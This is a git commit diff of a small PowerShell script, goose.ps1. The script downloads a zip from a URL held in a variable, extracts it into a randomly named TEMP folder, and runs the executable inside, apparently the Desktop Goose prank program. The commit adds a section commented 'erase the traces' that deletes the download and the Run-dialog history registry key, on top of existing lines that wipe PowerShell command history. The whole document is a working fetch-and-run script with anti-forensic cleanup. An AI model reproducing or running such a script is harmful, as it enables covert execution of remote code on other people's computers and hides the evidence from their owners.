f0e1495eeab98ba6060f0705236f7ec3059ed889
Xil <mail@xil.boats>
2022-12-29 14:02:14 +0100

    EFFICACITÉ

--- goose.ps1
+++ goose.ps1
@@ -1,7 +1,11 @@
 Invoke-WebRequest -URI "$lk" -OutFile $env:TEMP\goose.zip
-Expand-Archive -Path $env:TEMP\goose.zip -DestinationPath $env:TEMP\goose
-$goose = $env:TEMP + "\goose\Goose\Goose\GooseDesktop.exe"
+Expand-Archive -Path $env:TEMP\goose.zip -DestinationPath $env:TEMP\sinfbgqsyugfezlampokqs
+$goose = $env:TEMP + "\sinfbgqsyugfezlampokqs\GooseDesktop.exe"
 Invoke-Expression $goose
+
+# Efface les traces
+Remove-item -path $env:TEMP\goose.zip
+Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 clear
 exit
